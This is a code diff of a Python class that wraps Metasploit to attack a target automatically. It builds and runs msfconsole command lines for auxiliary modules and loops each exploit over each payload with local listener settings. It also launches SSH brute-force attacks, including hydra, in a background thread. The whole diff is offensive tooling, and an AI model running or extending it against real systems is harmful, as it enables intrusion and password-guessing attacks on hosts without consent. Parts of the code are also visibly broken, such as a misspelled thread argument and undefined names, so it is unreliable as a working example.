@@ -2,6 +2,7 @@
 from File_man import File_Man
 from micro_scans import MicroScans
 from port_enum import PortEnum
+from brute_ssh import BruteSSH
 
 # SYS_BASE
 import subprocess
@@ -23,6 +24,7 @@ class MetaFab():
         self.FM         = File_Man()
         self.MS         = MicroScans()
         self.PE         = PortEnum()
+        self.BS         = BruteSSH()
 
 
     # ? AUXIs
@@ -30,27 +32,28 @@ class MetaFab():
     def build_auxi(self, target_, port_, module_, dest_):
         try:
             meta_   = " msfconsole -q -x "
-            use_    = f" ' use {module_};"
-            rhost_  = f" set RHOST {target_};"
-            rport_  = f" set RPORT {port_};"
+            use_    = f" ' use {module_}; "
+            rhost_  = f" set RHOST {target_}; "
+            rport_  = f" set RPORT {port_}; "
 
 
             # ? SPECIAL set CONFIGS
-            weird_0 = f" set CONFIRM_DELETE true;"
-            svrhost_  = f" set SVRRHOST {target_};"
-            svrport_  = f" set SVRRPORT {port_};"
+            #weird_0 = f" set CONFIRM_DELETE true; "
+            #svrhost_  = f" set SVRRHOST {target_}; "
+            #svrport_  = f" set SVRRPORT {port_}; "
 
 
-            run_    = " run;"
+            run_    = " run; "
             exit_   = " exit; ' "
 
             to_run = meta_+use_+rhost_+rport_+run_+exit_
-            #print(f"\n!****!\n[TO_RUN_AUXI]:\n>>[>{str(to_run)}<]")
             print(f"[SAVING_AUXI]:[>{str(dest_)}<]")
+
             self.FM.write_file(dest_, to_run, "\n", "w")
+            print(f"\n!****!\n[TO_RUN_AUXI]:\n>>[>{str(to_run)}<]")
 
             auxi_ret = subprocess.getoutput(to_run)
-            print(f"\n*******\n[AUXILIARY_STACK]\n$$ {str(auxi_ret)} \n $$")
+            print(f"\n!****!\n[AUXILIARY_STACK]\n$$ {str(auxi_ret)} \n $$")
 
         except Exception as e:
             print(f"[E]:[BUILD_AUXI]:[{str(e)}]")
@@ -70,8 +73,8 @@ class MetaFab():
     def auxi_set_(self, i_, target_, port_, module_, dest_):
         try:
             # ! FILTER MODULE_DATA -> MOD_DIR
-            mod_ = str(module_.split(" ")[0])
-            print(f"[NEW_AUX_THREAD]:[{str(i_)}]")  #:[{str(mod_)}]")
+            mod_ = str(module_.split(" ")[0]).replace("'", "")
+            print(f"[NEW_AUX_THREAD]:[{str(i_)}]")
             print(f"[DEST_]:[{str(dest_)}]")
             self.build_auxi(target_, port_, mod_, dest_)
         except Exception as e:
@@ -225,63 +228,6 @@ class MetaFab():
             print(f"[E]:[COLLECTING_PAYLOADS]:[{str(e)}]")
 
 
-    # ! BUILD CONFIGS *NO-THREAD*
-    def collect_configs(self, l_host, l_port, prof_dir, meta_dir, target_, p_type, port_str, i_, thr_):
-        try:
-            print(f"[COLLECTING_CONFIGS]\n[TEST_#]:[>{str(i_)}<]\n[L_HOST]:[>{str(l_host)}<]\n[L_PORT]:[>{str(l_port)}<]\n[TARGET]:[>{str(target_)}<]\n[P_TYPE]:[>{str(p_type)}<]\n[F_DEST]:[>{str(meta_dir)}<]")
-
-            search_flags = self.PE.get_port_info(port_str, target_)
-
-            search_flags.append(p_type)
-            for fl_ in search_flags:
-                print(f"[FL_]:[>{str(fl_)}<]")
-
-            if "Y*1" in thr_:
-                print(f"[THR_]:[LVL_1]:[TRUE]")
-                Thread(traget=configs_base, args=(self, l_host, l_port, prof_dir, meta_dir, target_, p_type, port_str, i_, thr_)).start()
-            else:
-                print(f"[THR_]:[LVL_1]:[FLASE]")
-
-
-            my_auxi_ = self.collect_auxi_list(p_type, search_flags)
-            my_expl_ = self.collect_expl_list(p_type, search_flags)
-            my_payl_ = self.collect_payl_list(p_type, search_flags)
-
-            if "Y" in str(thr_).upper():
-                print("[RUNNING_AUXI_THREADS]\n^^^^^^^^^^^^^")
-                for i, aux in enumerate(my_auxi_):
-                    print(f"[I]:[{str(i)}]::[AUXI]:[>{str(aux)}<]")
-                    dest_ = meta_dir+f"aux_{str(i_)}_{str(i)}_.txt"
-                    self.auxi_thread(i_, target_, port_str, aux, dest_)
-                print("[RUNNING_EXPLOIT_THREADS]\n^^^^^^^^^^^^^")
-                for j, exp in enumerate(my_expl_):
-                    print(f"[J]:[{str(j)}]::[EXPL]:[>{str(exp)}<]")
-                    for k, pay in enumerate(my_payl_):
-                        print(f"[K]:[{str(k)}]::[PAYL]:[>{str(pay)}<]")
-                        dest_ = meta_dir+f"expl_{str(i_)}_{str(i)}_.txt"
-                        self.expl_thread(j, k, target_, port_, l_host, l_port,  module_, payload_, dest_)
-
-
-
-            if "N" in str(thr_).upper():
-                print("[RUNNING_AUXI_SETS]\n^^^^^^^^^^^^^")
-                for i, aux in enumerate(my_auxi_):
-                    print(f"[I]:[{str(i)}]::[AUXI]:[>{str(aux)}<]")
-                    dest_ = meta_dir+f"/aux_{str(i_)}_{str(i)}_.txt"
-                    self.auxi_set_(i_, target_, port_str, aux, dest_)
-                print("[RUNNING_EXPLOIT_SETS]\n^^^^^^^^^^^^^")
-                for j, exp in enumerate(my_expl_):
-                    print(f"[J]:[{str(j)}]::[EXPL]:[>{str(exp)}<]")
-                    for k, pay in enumerate(my_payl_):
-                        print(f"[K]:[{str(k)}]::[PAYL]:[>{str(pay)}<]")
-                        self.expl_set_(j, k, target_, port_, l_host, l_port,  module_, payload_, dest_)
-
-        except Exception as e:
-            print(f"[E]:[COLLECT_CONFIGS]:[>{str(e)}<]")
-
-
-
-
 
     # ! BASE_AUXI
     # TH_LVL_2
@@ -332,6 +278,69 @@ class MetaFab():
             print("[RUNNING_THREAD]:[LVL_1]")
         except Exception as e:
             print(f"[E]:[EXPLY_MAIN]:[>{str(e)}<]")
+
+
+    # ! BUILD CONFIGS *[1]:[3]-THREAD*
+    def collect_configs(self, l_host, l_port, prof_dir, meta_dir, target_, p_type, port_str, i_, thr_):
+        try:
+            print(f"[COLLECTING_CONFIGS]\n[TEST_#]:[>{str(i_)}<]\n[L_HOST]:[>{str(l_host)}<]\n[L_PORT]:[>{str(l_port)}<]\n[TARGET]:[>{str(target_)}<]\n[P_TYPE]:[>{str(p_type)}<]\n[F_DEST]:[>{str(meta_dir)}<]")
+
+            search_flags = self.PE.get_port_info(port_str, target_)
+
+            search_flags.append(p_type)
+            for fl_ in search_flags:
+                print(f"[FL_]:[>{str(fl_)}<]")
+
+            if "Y*1" in thr_:
+                print(f"[THR_]:[LVL_1]:[TRUE]")
+                Thread(traget=configs_base, args=(self, l_host, l_port, prof_dir, meta_dir, target_, p_type, port_str, i_, thr_)).start()
+            else:
+                print(f"[THR_]:[LVL_1]:[FLASE]")
+
+
+            my_auxi_ = self.collect_auxi_list(p_type, search_flags)
+            my_expl_ = self.collect_expl_list(p_type, search_flags)
+            my_payl_ = self.collect_payl_list(p_type, search_flags)
+
+
+            if "Y*3" in str(thr_).upper():
+                print("[THREAD_LVL]:[3]:[TRUE]")
+                print("[RUNNING_AUXI_THREADS]\n^^^^^^^^^^^^^")
+
+
+            # ! TESTING ONLY EXPL FOR NOW
+                #for i, aux in enumerate(my_auxi_):
+                #    print(f"[I]:[{str(i)}]::[AUXI]:[>{str(aux)}<]")
+                #    dest_ = meta_dir+f"aux_{str(i_)}_{str(i)}_.txt"
+                #    self.auxi_thread(i_, target_, port_str, aux, dest_)
+                print("[RUNNING_EXPLOIT_THREADS]\n^^^^^^^^^^^^^")
+                for j, exp in enumerate(my_expl_):
+                    print(f"[J]:[{str(j)}]::[EXPL]:[>{str(exp)}<]")
+                    for k, pay in enumerate(my_payl_):
+                        print(f"[K]:[{str(k)}]::[PAYL]:[>{str(pay)}<]")
+                        dest_ = meta_dir+f"expl_{str(i_)}_{str(i)}_.txt"
+                        self.expl_thread(j, k, target_, port_str, l_host, l_port,  exp, pay, dest_)
+
+
+
+            else:
+                print("[THREAD_LVL]:[3]:[FALSE]")
+                print("[RUNNING_AUXI_SETS]\n^^^^^^^^^^^^^")
+                #for i, aux in enumerate(my_auxi_):
+                #    print(f"[I]:[{str(i)}]::[AUXI]:[>{str(aux)}<]")
+                #    dest_ = meta_dir+f"/aux_{str(i_)}_{str(i)}_.txt"
+                #    self.auxi_set_(i_, target_, port_str, aux, dest_)
+                print("[RUNNING_EXPLOIT_SETS]\n^^^^^^^^^^^^^")
+                for j, exp in enumerate(my_expl_):
+                    print(f"[J]:[{str(j)}]::[EXPL]:[>{str(exp)}<]")
+                    for k, pay in enumerate(my_payl_):
+                        print(f"[K]:[{str(k)}]::[PAYL]:[>{str(pay)}<]")
+                        self.expl_set_(j, k, target_, port_str, l_host, l_port,  exp, pay, dest_)
+
+        except Exception as e:
+            print(f"[E]:[COLLECT_CONFIGS]:[>{str(e)}<]")
+
+
 
 
 
@@ -387,9 +396,32 @@ class MetaFab():
             print(f"[E]:[PORT_TYPE_CHECK]:[>{str(e)}<]")
 
 
+
+
+    # ! BRUTE_SET
+    def run_brutes(self, IP_, prof_dir):
+        try:
+            print("[RUNNING_WRUTE]")
+            self.BS.wrute_loop(IP_, prof_dir)
+            print("[RUNNING_HYDRA]")
+            self.BS.go_hydra(IP_, prof_dir)
+        except Exception as e:
+            print(f"[E]:[RUN_BRUTES]:[>{str(e)}<]")
+            
+
+
+
     # ! START 'McBRETA' _STACK_
     def set_meta_stack_(self, l_host, l_port, target_, prof_dir, type_, tcp_, thr_):
-        print(f"[RUNNING]:[SET_META_LAB]:[>{target_}<]:[>{type_}<]:[>{tcp_}<]")
+        print(f"[RUNNING]:[SET_META_LAB]:[>{target_}<]:[>{type_}<]:[>{tcp_}<]\n[THR_]:[>{thr_}<]")
+        try:
+            print("[RUNNING_BRUTES]")
+            Thread(target=self.run_brutes, args=(target_, prof_dir)).start()
+        except Exception as e:
+            print(f"[E]:[START_BRUTES]:[>{str(e)}<]")
+
+
+
         try:
             meta_dir = prof_dir+"/meta_dir/"
             self.FM.make_dir(meta_dir)
@@ -401,12 +433,13 @@ class MetaFab():
                         print(f"[X]:[RUNNING_]:\n    [#]:[{str(i)}]:\n    [PORT]:[{str(val)}]\n")
                         # ! CHECK PORT CONFIGS
                         p_type = self.check_port_type(val)
-                        if "N" in thr_:
-                            self.collect_configs(l_host, l_port, prof_dir, meta_dir, target_, p_type, str(val), i, thr_)
-                        # PER_PORT_[2]
-                        if "Y*2" in thr_:
+                        if "2" in thr_:
+                            print("[THREAD_LVL_2]")
                             Thread(target=self.collect_configs, args=(l_host, l_port, prof_dir, meta_dir, target_, p_type, str(val), i, thr_)).start()
                             time.sleep(0.5)
+                        else:
+                            self.collect_configs(l_host, l_port, prof_dir, meta_dir, target_, p_type, str(val), i, thr_)
+
                         time.sleep(5)
                     print("[ALL_AUXI_&_EXPL_RAN]")
                 except Exception as e:
